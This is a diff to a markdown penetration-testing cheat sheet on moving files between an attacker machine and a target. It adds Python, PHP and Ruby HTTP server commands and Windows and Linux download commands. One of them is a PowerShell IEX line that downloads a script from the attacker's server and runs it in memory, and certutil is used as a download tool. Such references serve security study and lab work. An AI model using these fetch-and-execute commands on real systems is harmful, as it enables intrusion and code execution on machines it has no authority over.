@@ -27,41 +27,68 @@ xcopy <source_path>\<file> \\<Kali IP>\share\
 ```
 
 
-## HTTP - from Kali to target
+## HTTP - from attacker to target OR target to attacker
 
+Python 2.7
 ```
 cd <path>
-sudo python -m SimpleHTTPServer 80
+python -m SimpleHTTPServer 8000
 ```
+
 or
+
+Python 3
 ```
 cd <path>
-sudo python3 -m http.server 80
+python3 -m http.server 8000
 ```
+
+or
+
+PHP
+```
+cd <path>
+php -S 0.0.0.0:8000
+```
+
+or
+
+Ruby 
+```
+cd <path>
+ruby -run -ehttpd . -p8000
+```
+
 
 ### download to Windows
 
 PowerShell
 ```
-Invoke-WebRequest -Uri 'http://<Kali IP>/<filename>' -OutFile <filename> 
+Invoke-WebRequest -Uri 'http://<http server IP>:8000/<filename>' -OutFile <filename> 
 ```
 
 PowerShell from cmd
 ```
-powershell.exe -command Invoke-WebRequest -Uri http://<Kali IP>/<filename> -OutFile <filename>
+powershell.exe -command Invoke-WebRequest -Uri http://<http server IP>:8000/<filename> -OutFile <filename>
 ```
 
 Download and execute with `Invoke-Expression` without saving file
 ```
-powershell.exe IEX(New-Object Net.WebClient).downloadstring(http://<Kali IP>/<filename>)
+powershell.exe IEX(New-Object Net.WebClient).downloadstring(http://<http server IP>:8000/<filename>)
 ```
-
 
 Certutil
 ```
-certutil -urlcache -split -f 'http://<Kali IP>/<filename>' <path_destiny><filename>
+certutil -urlcache -split -f 'http://<http server IP>:8000/<filename>' <path_destiny><filename>
 ```
 
+
+### download to Linux
+
+wget
+```
+wget <http server IP>:8000/<filename>
+```
 
 
 ## Links
